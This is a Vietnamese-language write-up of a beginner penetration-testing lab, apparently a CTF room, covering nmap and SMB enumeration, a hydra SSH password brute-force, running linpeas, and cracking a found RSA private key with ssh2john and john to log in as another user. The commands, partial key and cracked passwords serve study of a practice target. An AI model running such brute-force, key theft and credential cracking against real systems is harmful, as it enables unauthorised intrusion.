![image](https://github.com/user-attachments/assets/4c9afa81-1f7c-4457-a4fa-c55ddb615459)

# Comment

Bài lab này trong lúc rảnh thì mình mò được trên đây :). Độ khó basic kết hợp giữa một tí webapp và chủ yếu là leo quyền thông qua ssh

Các câu hỏi trong bài này liên quan đến từng bước từ recon đến exploit + post exploit nên mình sẽ trình bày luôn cách làm không chi tiết

# Analysis
## Nmap
```                                                                   
┌──(kali㉿kali)-[~]
└─$ nmap -sV -n 10.10.251.176
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 02:45 EDT
Nmap scan report for 10.10.251.176
Host is up (0.21s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.28 seconds
```
## Gobuster
Tìm dir ẩn 
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.251.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Enum4linux
Sử dụng tool này để check username 
```
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 10.10.251.176
```
## Hydra
Sau khi có username sử dụng tool này để tìm password
```
┌──(kali㉿kali)-[~]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.104.96 ssh 
```
## SSH
Sau khi có credential ta sẽ login bằng ssh sau đó kiểm tra, tuy nhiên hầu như không có quyền để đọc các file cần thiết

## SCP
Việc sử dụng tool này để Upload và Download file của **linpeas.sh** để kiểm tra quyền để leo 
```
┌──(kali㉿kali)-[/usr/share/peass]
└─$ scp /usr/share/peass/linpeas/linpeas.sh jan@10.10.251.176:/home/jan
```
## Linpeas.sh
Sau khi download file thành công tiến hành chạy và ta thấy 

```
jan@basic2:/tmp$ ./linpeas.sh 

-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN
lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU
hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl
lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE
3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ
LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7
bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb
RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy
<SNIP>
-----END RSA PRIVATE KEY-----
```

## SSH2JOHN
Sau khi có private key để login thông qua **ssh -i** ta tiến hành crack parse password

Copy nội dung file private key ở trên về máy `id_rsa`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh2john id_rsa > id_rsa_hash.txt

┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-07-29 01:41) 20.00g/s 1655Kp/s 1655Kc/s 1655KC/s beeswax..bambino1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Tiến hành login vào user `kay`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo ssh -i id_rsa kay@10.10.251.176

[sudo] password for kali: 
The authenticity of host '10.10.251.176 (10.10.251.176)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.251.176' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

# Results

![image](https://hackmd.io/_uploads/HyexAh4tA.png)

-------------------------**Hoàn thành bài lab!**-------------------------
